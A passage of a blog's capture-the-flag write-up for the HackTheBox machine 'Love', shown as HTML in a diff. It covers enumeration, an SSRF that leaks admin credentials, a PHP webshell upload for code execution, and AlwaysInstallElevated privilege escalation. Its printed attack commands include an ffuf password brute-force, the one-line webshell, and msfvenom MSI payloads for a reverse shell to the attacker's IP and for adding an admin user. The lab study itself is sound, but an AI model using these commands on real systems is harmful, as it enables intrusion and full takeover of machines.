+<li>Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="whatweb">Whatweb:</h4>
+<ul>
+<li>Lets run &ldquo;whatweb&rdquo; to see if I can glean some further information:
+<ul>
+<li><code>whatweb $box | sed 's/, /\n/g'</code>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="kali%20in%20HTB/BlogEntriesMade/Love/scans/nmap%20%20%f0%9f%8d%a3%20main%20%202GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2006:37:10%20zsh%20%e2%9d%af%20whatweb%20$box%20%7c%20sed%20%27s/,%20/%5cn/g%27%0a%0ahttp://10.129.48.103%20[200%20OK]%20Apache[2.4.46]%0aBootstrap%0aCookies[PHPSESSID]%0aCountry[RESERVED][ZZ]%0aHTML5%0aHTTPServer[Apache/2.4.46%20%28Win64%29%20OpenSSL/1.1.1j%20PHP/7.3.27]%0aIP[10.129.48.103]%0aJQuery%0aOpenSSL[1.1.1j]%0aPHP[7.3.27]%0aPasswordField[password]%0aScript%0aTitle[Voting%20System%20using%20PHP]%0aX-Powered-By[PHP/7.3.27]%0aX-UA-Compatible[IE=edge]">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in HTB/BlogEntriesMade/Love/scans/nmap  🍣 main  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>🕙 06:37:10 zsh ❯ whatweb $box | sed <span style="color:#e6db74">&#39;s/, /\n/g&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>http://10.129.48.103 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Apache<span style="color:#f92672">[</span>2.4.46<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Bootstrap
+</span></span><span style="display:flex;"><span>Cookies<span style="color:#f92672">[</span>PHPSESSID<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>HTML5
+</span></span><span style="display:flex;"><span>HTTPServer<span style="color:#f92672">[</span>Apache/2.4.46 <span style="color:#f92672">(</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1j PHP/7.3.27<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>IP<span style="color:#f92672">[</span>10.129.48.103<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>JQuery
+</span></span><span style="display:flex;"><span>OpenSSL<span style="color:#f92672">[</span>1.1.1j<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>PHP<span style="color:#f92672">[</span>7.3.27<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>PasswordField<span style="color:#f92672">[</span>password<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Script
+</span></span><span style="display:flex;"><span>Title<span style="color:#f92672">[</span>Voting System using PHP<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>X-Powered-By<span style="color:#f92672">[</span>PHP/7.3.27<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>X-UA-Compatible<span style="color:#f92672">[</span>IE<span style="color:#f92672">=</span>edge<span style="color:#f92672">]</span></span></span></code></pre></div>
+    
+</div>
+</li>
+<li>+Note+: I use <code>sed</code> to put the output across multiple lines for easier reading.</li>
+</ul>
+</li>
+</ul>
+<h4 id="dirbusting-the-webserver-using-ferox">Dirbusting the webserver using ferox:</h4>
+<ul>
+<li><strong>I Perform some directory busting to see if there are any interesting directories</strong>:
+<ul>
+<li><code>feroxbuster -u http://$domain/ --threads 20 --scan-limit 2 -q -r -o $domainFeroxScan.txt</code>
+<ul>
+<li>There are alot of hits as well as an admin panel.
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-23-161355_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>There are these files in <code>ADMIN</code> however they do not yield anything of note when I access them.
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-23-133255_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="love-dot-htb">love.htb:</h4>
+<h5 id="visiting-the-web-page">Visiting the web page:</h5>
+<ul>
+<li>It&rsquo;s always good to just manually click around and manually enumerate the pages available.</li>
+<li>I visit the web page <a href="http://love.htb/index.php">http://love.htb/index.php</a> and it&rsquo;s a login page for a voting system.
+<ul>
+<li>I try and login with test credentials and capture the post request.
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-23-071110_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="bruteforcing-login-with-ffuf">Bruteforcing Login with FFUF:</h5>
+<ul>
+<li>Lets try some bruteforcing, for fun. I get the <code>POST</code> request from burp
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-23-071216_.png">
+</figure>
+</li>
+<li>I modify it to the below so it&rsquo;s compatible with ffuf.</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="ffuf%20-w%20~/Wordlists/rockyou.txt%20-u%20$%27http://love.htb/login.php%27%20-X%20POST%20-H%20$%27Host:%20love.htb%27%20-H%20$%27Content-Length:%2031%27%20-H%20$%27Cache-Control:%20max-age=0%27%20-H%20$%27Accept-Language:%20en-US,en;q=0.9%27%20-H%20$%27Origin:%20http://love.htb%27%20-H%20$%27Content-Type:%20application/x-www-form-urlencoded%27%20-H%20$%27Upgrade-Insecure-Requests:%201%27%20-H%20$%27User-Agent:%20Mozilla/5.0%20%28Windows%20NT%2010.0;%20Win64;%20x64%29%20AppleWebKit/537.36%20%28KHTML,%20like%20Gecko%29%20Chrome/130.0.6723.70%20Safari/537.36%27%20-H%20$%27Accept:%20text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7%27%20-H%20$%27Referer:%20http://love.htb/%27%20-H%20$%27Accept-Encoding:%20gzip,%20deflate,%20br%27%20-H%20$%27Connection:%20keep-alive%27%20-b%20$%27PHPSESSID=au4g1f3co0aocdo2efhui2r734%27%20-d%20$%27voter=admin&amp;password=FUZZ&amp;login=%27%20-ic%20-fw%201%20-fs%20341">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ffuf -w ~/Wordlists/rockyou.txt -u <span style="color:#e6db74">$&#39;http://love.htb/login.php&#39;</span> -X POST -H <span style="color:#e6db74">$&#39;Host: love.htb&#39;</span> -H <span style="color:#e6db74">$&#39;Content-Length: 31&#39;</span> -H <span style="color:#e6db74">$&#39;Cache-Control: max-age=0&#39;</span> -H <span style="color:#e6db74">$&#39;Accept-Language: en-US,en;q=0.9&#39;</span> -H <span style="color:#e6db74">$&#39;Origin: http://love.htb&#39;</span> -H <span style="color:#e6db74">$&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> -H <span style="color:#e6db74">$&#39;Upgrade-Insecure-Requests: 1&#39;</span> -H <span style="color:#e6db74">$&#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36&#39;</span> -H <span style="color:#e6db74">$&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#39;</span> -H <span style="color:#e6db74">$&#39;Referer: http://love.htb/&#39;</span> -H <span style="color:#e6db74">$&#39;Accept-Encoding: gzip, deflate, br&#39;</span> -H <span style="color:#e6db74">$&#39;Connection: keep-alive&#39;</span> -b <span style="color:#e6db74">$&#39;PHPSESSID=au4g1f3co0aocdo2efhui2r734&#39;</span> -d <span style="color:#e6db74">$&#39;voter=admin&amp;password=FUZZ&amp;login=&#39;</span> -ic -fw <span style="color:#ae81ff">1</span> -fs <span style="color:#ae81ff">341</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>I let it run but get no hits.</li>
+</ul>
+<h5 id="reading-the-source-code">Reading the source code:</h5>
+<ul>
+<li>
+<p>I check the source code of the page as sometimes I can find useful information such as dev comments etc.</p>
+</li>
+<li>
+<p>I can see that the service is using software called <code>ADMINLTE</code></p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-23-072144_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>After some quick searching I find there is a vuln for LFI however it does not appear to vulnerable.</p>
+<ul>
+<li><a href="https://security.snyk.io/vuln/SNYK-JS-ADMINLTE-3314993">https://security.snyk.io/vuln/SNYK-JS-ADMINLTE-3314993</a></li>
+</ul>
+</li>
+</ul>
+<h4 id="staging-dot-love-dot-htb">staging.love.htb:</h4>
+<h5 id="visiting-the-web-page">Visiting the web page:</h5>
+<ul>
+<li>Looking at the page it&rsquo;s a file scanner.
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-23-140120_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>There is a DEMO where I can enter URL to have it scan.</li>
+</ul>
+<h4 id="discovering-the-demo-page-is-vulnerable-to-ssrf">Discovering the DEMO page is vulnerable to SSRF:</h4>
+<ul>
+<li>
+<p>I stand a python webserver and enter the information into the scanner on the site.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-23-140522_.png">
+</figure>
+</li>
+<li>I can see I get a valid connection.</li>
+</ul>
+</li>
+<li>
+<p>I enter local host address <a href="http://127.0.0.1:80">http://127.0.0.1:80</a> and it shows the login box for the service running on the root web address <code>love.htb</code>. This signifies a SSRF vulnerability</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-23-140816_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="retrieving-clear-text-credentials-from-the-service-running-on-port-5000">Retrieving Clear Text Credentials from the service running on port 5000:</h4>
+<ul>
+<li>
+<p>As I now know there is an SSRF vulnerability. I access the services I know are running but cannot access <code>7680</code> &amp; <code>5000</code> so far.</p>
+</li>
+<li>
+<p><strong>Service</strong> <code>7680</code>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-23-145640_.png">
+</figure>
+</li>
+<li>I get no hits.</li>
+</ul>
+</li>
+<li>
+<p><strong>Service</strong> <code>5000</code>:</p>
+<ul>
+<li>I get a hit &amp; retrieve clear text creds from a password service that is only accessible via <code>localhost</code>.
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-23-145719_.png">
+</figure>
+</li>
+<li><strong>Creds</strong>: <code>admin:@LoveIsInTheAir!!!!</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="conducting-an-internal-port-scan-via-the-ssrf-vulnerability">Conducting An Internal Port Scan VIA The SSRF Vulnerability:</h5>
+<ul>
+<li>
+<p>To ensure that I do not miss anything I also conduct an internal port scan for all ports in-case there is anything else running internally.</p>
+</li>
+<li>
+<p>I create a port list to use:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="seq%201%2065535%20%3e%20Ports.txt">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>seq <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">65535</span> &gt; Ports.txt</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>I copy the POST request from Burp.
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-23-143725_.png">
+</figure>
+</li>
+<li>I modify the curl command so it can be used with ffuf:
+<ul>
+<li>adding the wordlist <code>-w</code></li>
+<li>specifying the url <code>-u</code></li>
+<li>adding the injection point:
+<ul>
+<li><code>http://127.0.0.1:FUZZ</code></li>
+</ul>
+</li>
+<li>Removing the newlines and making 1 line</li>
+<li>Proxying all traffic via burp
+<ul>
+<li><code>-x http://127.0.0.1:8080</code></li>
+</ul>
+</li>
+<li>Remove size of 61 <code>-fs 61</code>
+<ul>
+<li>This can only be done once I have the initial response so I can then filter for the standard response.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="ffuf%20-w%20~/Wordlists/45.06-CustomWordlists/Ports.txt%20-u%20$%27http://staging.love.htb/beta.php%27%20-X%20$%27POST%27%20-H%20$%27Host:%20staging.love.htb%27%20-H%20$%27Content-Length:%2047%27%20-H%20$%27Cache-Control:%20max-age=0%27%20-H%20$%27Accept-Language:%20en-US,en;q=0.9%27%20-H%20$%27Origin:%20http://staging.love.htb%27%20-H%20$%27Content-Type:%20application/x-www-form-urlencoded%27%20-H%20$%27Upgrade-Insecure-Requests:%201%27%20-H%20$%27User-Agent:%20Mozilla/5.0%20%28Windows%20NT%2010.0;%20Win64;%20x64%29%20AppleWebKit/537.36%20%28KHTML,%20like%20Gecko%29%20Chrome/130.0.6723.70%20Safari/537.36%27%20-H%20$%27Accept:%20text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7%27%20-H%20$%27Referer:%20http://staging.love.htb/beta.php%27%20-H%20$%27Accept-Encoding:%20gzip,%20deflate,%20br%27%20-H%20$%27Connection:%20keep-alive%27%20-d%20$%27file=http%3A%2F%2F127.0.0.1%3AFUZZ&amp;read=Scan&#43;file%27%20-x%20http://127.0.0.1:8080%20-fs%2061">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ffuf -w ~/Wordlists/45.06-CustomWordlists/Ports.txt -u <span style="color:#e6db74">$&#39;http://staging.love.htb/beta.php&#39;</span> -X <span style="color:#e6db74">$&#39;POST&#39;</span> -H <span style="color:#e6db74">$&#39;Host: staging.love.htb&#39;</span> -H <span style="color:#e6db74">$&#39;Content-Length: 47&#39;</span> -H <span style="color:#e6db74">$&#39;Cache-Control: max-age=0&#39;</span> -H <span style="color:#e6db74">$&#39;Accept-Language: en-US,en;q=0.9&#39;</span> -H <span style="color:#e6db74">$&#39;Origin: http://staging.love.htb&#39;</span> -H <span style="color:#e6db74">$&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> -H <span style="color:#e6db74">$&#39;Upgrade-Insecure-Requests: 1&#39;</span> -H <span style="color:#e6db74">$&#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36&#39;</span> -H <span style="color:#e6db74">$&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#39;</span> -H <span style="color:#e6db74">$&#39;Referer: http://staging.love.htb/beta.php&#39;</span> -H <span style="color:#e6db74">$&#39;Accept-Encoding: gzip, deflate, br&#39;</span> -H <span style="color:#e6db74">$&#39;Connection: keep-alive&#39;</span> -d <span style="color:#e6db74">$&#39;file=http%3A%2F%2F127.0.0.1%3AFUZZ&amp;read=Scan+file&#39;</span> -x http://127.0.0.1:8080 -fs <span style="color:#ae81ff">61</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>
+<p>I have added the image of the command below as I know sometimes the formatting of my site can lead to the code boxes running off of the page. (will fix, soz bbz)</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-23-144357_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Findings</strong>: I just get a list of all the ports I have already found and nothing additional of note.</p>
+</li>
+</ul>
+<h4 id="accessing-the-admin-panel">Accessing the admin panel:</h4>
+<ul>
+<li>
+<p>I use the creds on the admin panel to login</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-23-161451_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Looking at the admin panel I can see it&rsquo;s called &ldquo;Voting System&rdquo; I do some googling and find the source code here - <a href="https://code-projects.org/voting-system-in-php-with-source-code/">https://code-projects.org/voting-system-in-php-with-source-code/</a></p>
+</li>
+</ul>
+<h2 id="2-dot-foothold">2. Foothold:</h2>
+<h3 id="getting-rce-on-the-host-and-a-reverse-shell">Getting RCE on the host &amp; a reverse shell:</h3>
+<ul>
+<li>
+<p>I do some searching and find an <a href="https://github.com/h4md153v63n/CVEs/blob/main/Voting_System/Voting_System-SQL_Injection-2.md">SQL vulnerability</a> that enables the ability to dump the voters database, however if I look at the voters panel on the admin portal there are no registered users. So we could dump it and get an empty <code>db</code>.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-23-165345_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Looking further I find this exploit enabling RCE via an authenticated file upload attack.</p>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/49445">https://www.exploit-db.com/exploits/49445</a>
+<ul>
+<li>Looking at the exploit it&rsquo;s apparent that this is just a PHP reverse shell being uploaded as a profile photo for a user.</li>
+<li>The script connects, creates a new user and uploads the photo as a reverse shell, it then requests the reverse shell &amp; triggers it.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>To verify this works I create a simple <code>php</code> shell &amp; save it as <code>shell.php</code></p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%3c?php%20system%28$_GET[%27cmd%27]%29;%20?%3e">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p>I upload it.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-23-174606_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I open the image in a new tab.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-23-174629_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I enter a simple command and it executes proving it&rsquo;s vulnerable and that I have RCE.</p>
+<ul>
+<li><code>http://love.htb/images/shell.php?cmd=dir</code></li>
+<li><figure><img src="/ox-hugo/2024-12-23-174823_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Now I could get a reverse-shell but this a chance for me to play with tools I don&rsquo;t really use often, so I am going to use the <a href="https://github.com/WhiteWinterWolf/wwwolf-php-webshell">wwwolf-php-webshell</a>. It&rsquo;s an amazing interactive web-shell.</p>
+</li>
+<li>
+<p>I download the main <code>webshell.php</code> file and repeat the same process as before, uploading as a profile pic for a new user and then accessing that profile pic.</p>
+</li>
+<li>
+<p>When I view the image I have this nice interactive webshell</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-23-181927_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Let&rsquo;s grab our user flag:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-23-182110_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I upload nc64.exe.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-23-182216_.png">
+</figure>
+</li>
+<li>My webshell fun was short-lived, I want to run tools easily on the host OS.</li>
+</ul>
+</li>
+<li>
+<p>I connect back to my attack machine &amp; get a reverse shell.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-23-182401_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="enumerating-the-host-as-phoebe">Enumerating the host as phoebe:</h3>
+<ul>
+<li>
+<p>I can see I am logged in as a user called <code>phoebe</code> I run the following command to enumerate information about her and other logged in users.</p>
+<ul>
+<li><code>whoami /priv /groups; query user; net user</code></li>
+<li><strong>Shows</strong>:
+<ul>
+<li>User privs</li>
+<li>User Group membership</li>
+<li>Other logged in users</li>
+<li>All users on the machine: (done last as list may be extensive)</li>
+</ul>
+</li>
+<li><figure><img src="/ox-hugo/2024-12-23-182925_.png">
+</figure>
+
+<ul>
+<li>Nothing of note here.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>I upload Winpeas and execute it.</p>
+<ul>
+<li>It extracts phoebes NTLMv2 hash. I run it through hashcat against rock you but it won&rsquo;t crack.</li>
+<li><figure><img src="/ox-hugo/2024-12-24-071628_.png">
+</figure>
+</li>
+<li>+Note+: As this is an easier box, I am not making a custom wordlist with CeWL as I don&rsquo;t see that being a viable option given the difficulty of the box.</li>
+</ul>
+</li>
+<li>
+<p><strong>Always install elevated available</strong>: Which can be a viable privesc path.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-24-074847_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>It is possible to check this setting manually too by querying the registry directly</strong></p>
+<ul>
+<li>
+<p>Enumerate if the Key exists (&amp; therefore policy enabled) using Powershell:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Query machine policy (system wide):</span>
+</span></span><span style="display:flex;"><span>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Query user policy (is the key set for the user I are logged in with )</span>
+</span></span><span style="display:flex;"><span>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-24-080900_.png">
+</figure>
+
+<ul>
+<li>As I can see it&rsquo;s set globally as a machine policy, this is bad! As it means that any user can install anything with admin privileges. We can use this to elevate to System.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="primer-key-differences-in-reg-queries">Primer: Key Differences in reg queries:</h4>
+<ol>
+<li>
+<p><strong>Registry Hive Scope</strong>:</p>
+<ul>
+<li>
+<p><code>HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code>:</p>
+<ul>
+<li>Refers to <code>HKEY_LOCAL_MACHINE (HKLM)</code>, which applies settings at the <strong>system-wide level</strong>.</li>
+<li>Changes here affect <strong>all users on the machine</strong>.</li>
+</ul>
+</li>
+<li>
+<p><code>HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code>:</p>
+<ul>
+<li>Refers to <code>HKEY_CURRENT_USER (HKCU)</code>, which applies settings at the <strong>user-specific level</strong>.</li>
+<li>Only affects the currently logged-in user.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Purpose</strong></p>
+<ul>
+<li>
+<p><code>HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</code>:</p>
+<ul>
+<li>specifically queries the <code>AlwaysInstallElevated</code> value in the <code>HKEY_LOCAL_MACHINE</code> hive.</li>
+<li>Represents a system-wide policy that determines if MSI files can be installed with elevated privileges (Administrator rights).
+<ul>
+<li><strong>Enabled (<code>1</code>)</strong>: Allows all users to install MSI files with elevated privileges.</li>
+<li><strong>Disabled (<code>0</code> or absent)</strong>: Prevents this behavior globally.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code>:</p>
+<ul>
+<li>Specifically queries the <code>AlwaysInstallElevated</code> value.</li>
+<li>Determines whether the user can install software with elevated privileges (Administrator rights).
+<ul>
+<li><strong>Enabled (<code>1</code>)</strong>: Allows installing MSI files with elevated privileges.</li>
+<li><strong>Disabled (<code>0</code> or absent)</strong>: Prevents this behavior.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="3-dot-privilege-escalation">3. Privilege Escalation:</h2>
+<h3 id="privesc-method-1-creating-a-malicious-msi-reverse-shell-with-msfvenom">Privesc Method 1: Creating a malicious msi reverse shell with msfvenom:</h3>
+<ul>
+<li>
+<p>I use msfvenom to create a malicious <code>evil.msi</code> file that is a reverse shell</p>
+<ul>
+<li><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.80 LPORT=8888 -a x64 --platform Windows -f msi -o evil.msi</code></li>
+<li><figure><img src="/ox-hugo/2024-12-24-081045_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I standup my python webserver.</p>
+<ul>
+<li><code>python3 -m http.server 9000</code></li>
+</ul>
+</li>
+<li>
+<p>Copy the malicious <code>msi</code> to the host:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-24-081339_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Standup my nc listener:</p>
+<ul>
+<li><code>rlwrap -cAr nc -nvlp 8888</code></li>
+</ul>
+</li>
+<li>
+<p>Run the <code>.msi</code> file and catch my <code>NT/Authority\system</code> shell.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-24-081500_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Get the root flag:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-24-081550_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="privesc-method-2-adding-a-new-admin-user-with-msfvenom">Privesc Method 2: Adding a new Admin User with msfvenom:</h3>
+<ul>
+<li>
+<p>+Note+: This method is a bit more long winded and uses the same exploitation method of &ldquo;always install elevated&rdquo; but is a different route.</p>
+</li>
+<li>
+<p>I use msfvenom to create our malicious <code>msi</code> to add a new user.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="msfvenom%20-p%20windows/adduser%20USER=bloodstiller%20PASS=BL00dstiLL3r#%20--platform%20Windows%20-f%20msi%20-o%20addAdminUser.msi">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>msfvenom -p windows/adduser USER<span style="color:#f92672">=</span>bloodstiller PASS<span style="color:#f92672">=</span>BL00dstiLL3r# --platform Windows -f msi -o addAdminUser.msi</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-24-121654_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I standup my python webserver.</p>
+<ul>
+<li><code>python3 -m http.server 9000</code></li>
+</ul>
+</li>
+<li>
+<p>Copy the malicious <code>msi</code> to the host:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-24-121738_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Verify there are only the legitimate users on the host:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-24-121836_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Run the malicious <code>addAdminUser.msi</code>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-24-121926_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Verify the user has been added:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-24-121949_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Now I <strong>cannot</strong> to use <code>/runas</code> as the shell is limited so I cannot pass credentials directly. Instead to run commands as the new user I will need to use a <code>PowerShell Credentialed Object</code>.</p>
+<ul>
+<li><strong>A PowerShell credential object is</strong> an instance of the <code>System.Management.Automation.PSCredential</code> class that securely stores a username and password, created using <code>Get-Credential</code> (gui-prompt) or manually with the below (which I will use.)
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
